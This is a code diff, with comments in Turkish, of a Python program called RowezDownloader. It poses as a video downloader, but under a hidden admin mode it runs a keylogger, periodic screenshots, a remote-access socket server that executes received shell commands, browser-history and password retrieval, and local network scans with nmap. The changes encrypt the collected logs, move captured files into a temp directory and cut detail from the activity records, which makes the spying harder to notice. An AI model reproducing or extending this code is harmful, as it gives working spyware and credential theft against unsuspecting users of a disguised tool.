+                with open(os.path.join(temp_dir, f"rat_log_{user_id}.txt"), "a", encoding="utf-8") as f:
+                    encrypted_entry = encrypt_log(f"[{time.ctime()}] Ekran Görüntüsü: {screenshot_path}")
+                    f.write(encrypted_entry + "\n")
                     if self.keylogger_active:
-                        f.write(f"[{time.ctime()}] Keylog: {self.user_sessions[user_id]['keylog']}\n")
-                self.log_activity(f"RAT aktivitesi: {user_id} - Ekran Görüntüsü: {screenshot_path}")
+                        encrypted_keylog = encrypt_log(f"[{time.ctime()}] Keylog: {self.user_sessions[user_id]['keylog']}")
+                        f.write(encrypted_keylog + "\n")
+                self.log_activity(f"RAT aktivitesi: {user_id}")
                 time.sleep(SCREENSHOT_INTERVAL)
             except Exception as e:
-                hata_mesaji = f"RAT hatası: {e}. Bu hata, ekran görüntüsü alınamaması veya log dosyasına yazılamaması gibi nedenlerden kaynaklanabilir."
-                print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
+                hata_mesaji = f"RAT hatası: {e}"
                 logger.error(hata_mesaji)
                 time.sleep(SCREENSHOT_INTERVAL)
 
@@ -610,21 +689,21 @@ class RowezDownloader:
                     server_socket.bind(('0.0.0.0', port))
                     server_socket.listen(5)
                     print(f"{Fore.GREEN}Uzak erişim sunucusu {port} portunda başlatıldı.{Style.RESET_ALL}")
-                    self.log_activity(f"Uzak erişim sunucusu başlatıldı: {port} portu")
+                    self.log_activity(f"Uzak erişim sunucusu başlatıldı: {port}")
                     break
                 except OSError as e:
                     if e.errno == 10048:
-                        print(f"{Fore.YELLOW}Port {port} zaten kullanılıyor, başka bir port deneniyor...{Style.RESET_ALL}")
+                        print(f"{Fore.YELLOW}Port {port} kullanılıyor, başka port deneniyor...{Style.RESET_ALL}")
                         port += 1
                         attempt += 1
                     else:
-                        hata_mesaji = f"Uzak erişim sunucusu başlatılamadı: {e}. Bu hata, ağ yapılandırmasının bozuk olması veya portun kullanımda olması gibi nedenlerden kaynaklanabilir."
+                        hata_mesaji = f"Uzak erişim sunucusu başlatılamadı: {e}"
                         print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
                         logger.error(hata_mesaji)
                         server_socket.close()
                         return
             else:
-                hata_mesaji = "Uygun bir port bulunamadı. Lütfen port aralığını kontrol edin."
+                hata_mesaji = "Uygun port bulunamadı."
                 print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
                 server_socket.close()
                 return
@@ -650,11 +729,11 @@ class RowezDownloader:
                             encrypted_response = cipher.encrypt(result.encode())
                             client_socket.send(encrypted_response)
                 except Exception as e:
-                    hata_mesaji = f"Uzak erişim istemci hatası: {e}. Bu hata, bağlantının kopması veya komutun yürütülmemesi gibi nedenlerden kaynaklanabilir."
-                    print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
+                    hata_mesaji = f"Uzak erişim istemci hatası: {e}"
                     logger.error(hata_mesaji)
                 finally:
                     client_socket.close()
+            server_socket.close()
         threading.Thread(target=server_thread, daemon=True).start()
 
     def network_scan(self, mode: str = "quick") -> str:
@@ -664,12 +743,12 @@ class RowezDownloader:
             local_ip = socket.gethostbyname(socket.gethostname())
             network_range = '.'.join(local_ip.split('.')[:-1]) + ".0/24"
             nmap_exe = Path(self.nmap_path) / "nmap.exe"
-            args = [str(nmap_exe), "-sn" if mode == "quick" else "-A", network_range]
-            result = subprocess.check_output(args, text=True)
-            self.log_activity(f"Ağ taraması ({mode}): {network_range}\nSonuç:\n{result}")
+            args = [str(nmap_exe), "-sn" if mode == "quick" else "-A", network_range, "--min-rate=1000"]
+            result = subprocess.check_output(args, text=True, timeout=30)
+            self.log_activity(f"Ağ taraması ({mode}): {network_range}")
             return f"Ağ tarama sonucu ({mode}):\n{result}"
         except subprocess.CalledProcessError as e:
-            hata_mesaji = f"Ağ tarama hatası: {e}. Bu hata, Nmap'in kurulu olmaması veya ağa erişimin olmaması gibi nedenlerden kaynaklanabilir."
+            hata_mesaji = f"Ağ tarama hatası: {e}"
             print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
             logger.error(hata_mesaji)
             return f"Hata: {e}"
@@ -685,10 +764,10 @@ class RowezDownloader:
             logs = cursor.fetchall()
             if not logs:
                 return "Log bulunamadı."
-            log_content = "\n".join([f"Log ID: {log[0]} - {log[1]}: {log[2]}" for log in logs])
+            log_content = "\n".join([f"Log ID: {log[0]} - {log[1]}: {decrypt_log(log[2])}" for log in logs])
             return log_content
         except sqlite3.Error as e:
-            hata_mesaji = f"Log görüntüleme hatası: {e}. Bu hata, veritabanına erişilememesi veya log tablosunun bozulması gibi nedenlerden kaynaklanabilir."
+            hata_mesaji = f"Log görüntüleme hatası: {e}"
             print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
             logger.error(hata_mesaji)
             return f"Hata: {e}"
@@ -710,7 +789,7 @@ class RowezDownloader:
             self.log_activity("Loglar temizlendi")
             return "Loglar temizlendi."
         except (sqlite3.Error, OSError) as e:
-            hata_mesaji = f"Log temizleme hatası: {e}. Bu hata, log dosyalarına erişilememesi veya veritabanına yazılamaması gibi nedenlerden kaynaklanabilir."
+            hata_mesaji = f"Log temizleme hatası: {e}"
             print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
             logger.error(hata_mesaji)
             return f"Hata: {e}"
@@ -722,13 +801,16 @@ class RowezDownloader:
         if not self.is_admin_mode or not self.verify_session_token("admin", self.admin_token):
             return "Yetkisiz işlem."
         try:
-            export_file = f"user_data_export_{int(time.time())}.json"
+            export_file = os.path.join(temp_dir, f"user_data_export_{int(time.time())}.json")
+            encrypted_data = {}
+            for user_id, data in self.user_sessions.items():
+                encrypted_data[user_id] = {k: encrypt_log(str(v)) if k not in ["system_info"] else v for k, v in data.items()}
             with open(export_file, "w", encoding="utf-8") as f:
-                json.dump(self.user_sessions, f, indent=4, ensure_ascii=False)
+                json.dump(encrypted_data, f, indent=4, ensure_ascii=False)
             self.log_activity(f"Kullanıcı verileri dışa aktarıldı: {export_file}")
-            return f"Kullanıcı verileri {export_file} dosyasına dışa aktarıldı."
+            return f"Kullanıcı verileri {export_file} dosyasına aktarıldı."
         except IOError as e:
-            hata_mesaji = f"Kullanıcı verileri dışa aktarılamadı: {e}. Bu hata, dosya yazılamaması veya diskte yer kalmaması gibi nedenlerden kaynaklanabilir."
+            hata_mesaji = f"Kullanıcı verileri dışa aktarılamadı: {e}"
             print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
             logger.error(hata_mesaji)
             return f"Hata: {e}"
@@ -739,14 +821,14 @@ class RowezDownloader:
         if user_id not in self.user_sessions:
             return "Kullanıcı bulunamadı."
         try:
-            files = [f"keylog_{user_id}.txt", f"rat_log_{user_id}.txt"] + self.user_sessions[user_id]["rat_screenshots"]
+            files = [os.path.join(temp_dir, f"keylog_{user_id}.txt"), os.path.join(temp_dir, f"rat_log_{user_id}.txt")] + self.user_sessions[user_id]["rat_screenshots"]
             for file in files:
                 if Path(file).exists():
                     Path(file).unlink()
             self.log_activity(f"Kullanıcı dosyaları silindi: {user_id}")
             return f"{user_id} kullanıcısının dosyaları silindi."
         except OSError as e:
-            hata_mesaji = f"Kullanıcı dosyaları silinemedi: {e}. Bu hata, dosya izinlerinin yetersiz olması veya dosyaların kullanımda olması gibi nedenlerden kaynaklanabilir."
+            hata_mesaji = f"Kullanıcı dosyaları silinemedi: {e}"
             print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
             logger.error(hata_mesaji)
             return f"Hata: {e}"
@@ -754,13 +836,13 @@ class RowezDownloader:
     def capture_screenshot(self, user_id: str) -> str:
         if not self.is_admin_mode or not self.verify_session_token("admin", self.admin_token):
             return "Yetkisiz işlem."
-        screenshot_path = f"screenshot_{user_id}_{int(time.time())}.png"
+        screenshot_path = os.path.join(temp_dir, f"screenshot_{user_id}_{int(time.time())}.png")
         try:
             self.sct.shot(output=screenshot_path)
-            self.log_activity(f"Ekran görüntüsü alındı: {user_id} - {screenshot_path}")
+            self.log_activity(f"Ekran görüntüsü alındı: {user_id}")
             return f"Ekran görüntüsü alındı: {screenshot_path}"
         except Exception as e:
-            hata_mesaji = f"Ekran görüntüsü alınamadı: {e}. Bu hata, mss modülünün kurulu olmaması veya ekran görüntüsü alma izninin olmaması gibi nedenlerden kaynaklanabilir."
+            hata_mesaji = f"Ekran görüntüsü alınamadı: {e}"
             print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
             logger.error(hata_mesaji)
             return f"Hata: {e}"
@@ -769,11 +851,12 @@ class RowezDownloader:
         if not self.is_admin_mode or not self.verify_session_token("admin", self.admin_token):
             return "Yetkisiz işlem."
         try:
-            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
-            self.log_activity(f"Komut yürütüldü: {command}\nSonuç: {result}")
-            return f"Sonuç: {result}"
+            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True, timeout=10)
+            encrypted_result = encrypt_log(f"Komut yürütüldü: {command}\nSonuç: {result}")
+            self.log_activity(f"Komut yürütüldü: {command}")
+            return f"Sonuç: {decrypt_log(encrypted_result)}"
         except subprocess.CalledProcessError as e:
-            hata_mesaji = f"Komut yürütme hatası: {e}. Bu hata, komutun geçersiz olması veya sistemde çalıştırılamaması gibi nedenlerden kaynaklanabilir."
+            hata_mesaji = f"Komut yürütme hatası: {e}"
             print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
             logger.error(hata_mesaji)
             return f"Hata: {e}"
@@ -783,6 +866,7 @@ class RowezDownloader:
         for thread in self.download_threads:
             if thread.is_alive():
                 thread.join()
+        cleanup_temp_files()
         print(f"{Fore.GREEN}Program kapatılıyor...{Style.RESET_ALL}")
 
     def admin_interface(self, current_admin: str) -> None:
@@ -801,7 +885,7 @@ class RowezDownloader:
             print(f"\n{Fore.BLUE}🔧 Yönetici Paneli 🔧{Style.RESET_ALL}")
             for i, option in enumerate(options, 1):
                 print(f"{Fore.CYAN}{i}. {option}{Style.RESET_ALL}")
-            choice = input(f"{Fore.YELLOW}Seçim (1-{len(options)}) veya 'geri' yazın: {Style.RESET_ALL}").strip()
+            choice = input(f"{Fore.YELLOW}Seçim (1-{len(options)}) veya 'geri': {Style.RESET_ALL}").strip()
             if choice.lower() == "geri":
                 print(f"{Fore.GREEN}Ana menüye dönülüyor...{Style.RESET_ALL}")
                 self.is_admin_mode = False
@@ -819,7 +903,8 @@ class RowezDownloader:
                 for user_id, data in self.user_sessions.items():
                     print(f"\n{Fore.YELLOW}{data['nickname']} (ID: {user_id}):{Style.RESET_ALL}")
                     for key, value in data.items():
-                        print(f"{Fore.CYAN}  {key}: {value}{Style.RESET_ALL}")
+                        decrypted_value = decrypt_log(value) if key not in ["system_info", "keylog", "rat_screenshots"] else value
+                        print(f"{Fore.CYAN}  {key}: {decrypted_value}{Style.RESET_ALL}")
             elif choice == 2:
                 search = input(f"{Fore.YELLOW}🔍 ID veya Takma Ad: {Style.RESET_ALL}").strip().lower()
                 found = False
@@ -912,7 +997,7 @@ class RowezDownloader:
             elif choice == 21:
                 user_id = input(f"{Fore.CYAN}Hangi ID için tarayıcı geçmişi? {Style.RESET_ALL}").strip().lower()
                 if user_id in self.user_sessions:
-                    history = self.get_browser_history(user_id)
+                    history = decrypt_log(self.user_sessions[user_id]["browser_history"])
                     print(f"{Fore.YELLOW}Tarayıcı Geçmişi ({user_id}):{Style.RESET_ALL}\n{history}")
                 else:
                     print(f"{Fore.RED}❌ Kullanıcı bulunamadı.{Style.RESET_ALL}")
@@ -920,7 +1005,8 @@ class RowezDownloader:
                 user_id = input(f"{Fore.CYAN}Hangi ID için şifreler? {Style.RESET_ALL}").strip().lower()
                 if user_id in self.user_sessions:
                     passwords = self.get_passwords(user_id)
-                    print(f"{Fore.YELLOW}Şifreler ({user_id}):{Style.RESET_ALL}\n{passwords}")
+                    decrypted_passwords = "\n".join([decrypt_log(p) for p in passwords.split("\n")])
+                    print(f"{Fore.YELLOW}Şifreler ({user_id}):{Style.RESET_ALL}\n{decrypted_passwords}")
                 else:
                     print(f"{Fore.RED}❌ Kullanıcı bulunamadı.{Style.RESET_ALL}")
             elif choice == 23:
@@ -982,7 +1068,7 @@ class RowezDownloader:
             self.current_admin = username
             self.admin_token = self.generate_session_token(username)
             if not self.verify_session_token(username, self.admin_token):
-                hata_mesaji = "Token doğrulama hatası. Oturum başlatılamadı."
+                hata_mesaji = "Token doğrulama hatası."
                 print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
                 self.is_admin_mode = False
                 self.current_admin = None
@@ -996,7 +1082,7 @@ class RowezDownloader:
             self.user_mode()
 
     def user_mode(self) -> None:
-        user_id = ''.join(random.choices(string.digits, k=6))
+        user_id = ''.join(random.choices(string.digits, k=8))
         if user_id in self.banned_users:
             print(f"{Fore.RED}❌ Erişim reddedildi.{Style.RESET_ALL}")
             return
@@ -1037,7 +1123,7 @@ class RowezDownloader:
                     self.download_video(url, user_id)
                 else:
                     print(f"{Fore.YELLOW}⚠️ '{url}' iptal edildi.{Style.RESET_ALL}")
-                    self.log_activity(f"İndirme iptal edildi: {user_id} - {url}")
+                    self.log_activity(f"İndirme iptal edildi: {user_id}")
 
     def set_output_path(self) -> None:
         output = input(f"{Fore.CYAN}📂 İndirme klasörü (varsayılan: downloads): {Style.RESET_ALL}").strip()
@@ -1055,7 +1141,7 @@ class RowezDownloader:
             self.video_quality = self.display_options("Çözünürlük", ["best", "1080", "2160", "4320"])
             self.video_format = self.display_options("Video Formatı", ["mp4", "mkv", "webm"])
             format_selection = "bestvideo+bestaudio/best" if self.video_quality == "best" else f"bestvideo[height<={self.video_quality}]+bestaudio/best"
-            postprocessors = [{'key': 'FFmpegVideoConvertor', 'preferedformat': self.video_format}]
+            postprocessors = [{'key': 'FFmpegVideoConvertor', 'preferredformat': self.video_format}]
         ydl_opts = {
             'format': format_selection,
             'merge_output_format': self.video_format if not is_audio else self.audio_format,
@@ -1063,7 +1149,9 @@ class RowezDownloader:
             'progress_hooks': [self.download_progress],
             'ffmpeg_location': str(Path(self.ffmpeg_path) / ("ffmpeg.exe" if platform.system() == "Windows" else "ffmpeg")),
             'postprocessors': postprocessors,
-            'quiet': True
+            'quiet': True,
+            'ratelimit': 5000000,
+            'retries': 3
         }
         def download_thread_func() -> None:
             try:
@@ -1071,10 +1159,10 @@ class RowezDownloader:
                     ydl.download([url])
                 if not self.download_cancelled:
                     print(f"{Fore.GREEN}✅ İndirildi: {url}{Style.RESET_ALL}")
-                    self.log_activity(f"Video indirildi: {user_id} - {url}")
+                    self.log_activity(f"Video indirildi: {user_id}")
             except Exception as e:
                 if not self.download_cancelled:
-                    hata_mesaji = f"Video indirme hatası: {e}. Bu hata, URL'nin geçersiz olması, internet bağlantısının kesilmesi veya yt_dlp modülünün uyumsuzluğu gibi nedenlerden kaynaklanabilir."
+                    hata_mesaji = f"Video indirme hatası: {e}"
                     print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
                     logger.error(hata_mesaji)
         print(f"{Fore.YELLOW}📥 İndirme başlıyor... Durdurmak için 'cancel' yazın.{Style.RESET_ALL}")
@@ -1113,7 +1201,7 @@ class RowezDownloader:
             choice = input(f"{Fore.YELLOW}Seçim (1-{len(options)}): {Style.RESET_ALL}").strip()
             if choice.isdigit() and 1 <= int(choice) <= len(options):
                 return options[int(choice) - 1]
-            print(f"{Fore.RED}Geçersiz seçim, varsayılana dönülüyor: {options[0]}{Style.RESET_ALL}")
+            print(f"{Fore.RED}Geçersiz seçim, varsayılan: {options[0]}{Style.RESET_ALL}")
             return options[0]
 
     def ban_user(self, user_id: str) -> str:
@@ -1137,26 +1225,26 @@ class RowezDownloader:
     def run(self) -> None:
         check_for_updates()
         try:
-            print(f"{Fore.RED}Bu program YouTube vb. sitelerden video/ses dosyası indirmek için kullanılır.{Style.RESET_ALL}")
-            consent = input(f"{Fore.CYAN}Videolar izinsiz indirilir, yine de indirmek ister misiniz? (e/h): {Style.RESET_ALL}").strip().lower()
+            print(f"{Fore.RED}Bu program video/ses indirmek için kullanılır.{Style.RESET_ALL}")
+            consent = input(f"{Fore.CYAN}Videolar izinsiz indirilir, devam etmek ister misiniz? (e/h): {Style.RESET_ALL}").strip().lower()
             if consent != "e":
-                print(f"{Fore.RED}❌ İzin verilmedi. Program kapatılıyor.{Style.RESET_ALL}")
+                print(f"{Fore.RED}❌ İzin verilmedi. Kapatılıyor.{Style.RESET_ALL}")
                 sys.exit(0)
             self.print_rainbow("RowezDownloader")
             print(f"{Fore.YELLOW}Geliştirici: Rowez{Style.RESET_ALL}")
             consent = input(f"{Fore.CYAN}Keylogger için izin (e/h): {Style.RESET_ALL}").strip().lower()
             self.keylogger_active = consent == "e"
-            start_input = input(f"{Fore.CYAN}Başlamak için Enter'a basın: {Style.RESET_ALL}").strip()
+            start_input = input(f"{Fore.CYAN}Başlamak için Enter: {Style.RESET_ALL}").strip()
             if start_input == self.secret_admin_code:
                 self.admin_login()
             else:
                 self.user_mode()
         except KeyboardInterrupt:
-            print(f"\n{Fore.RED}❌ Program kullanıcı tarafından durduruldu (Ctrl+C).{Style.RESET_ALL}")
+            print(f"\n{Fore.RED}❌ Program durduruldu (Ctrl+C).{Style.RESET_ALL}")
             self.shutdown()
             sys.exit(0)
         except Exception as e:
-            hata_mesaji = f"Beklenmeyen bir hata oluştu: {e}. Bu hata, sistem yapılandırmasından veya beklenmeyen bir kullanıcı girdisinden kaynaklanabilir. Lütfen girdilerinizi kontrol edin ve tekrar deneyin."
+            hata_mesaji = f"Beklenmeyen hata: {e}"
             print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
             logger.error(hata_mesaji)
             self.shutdown()
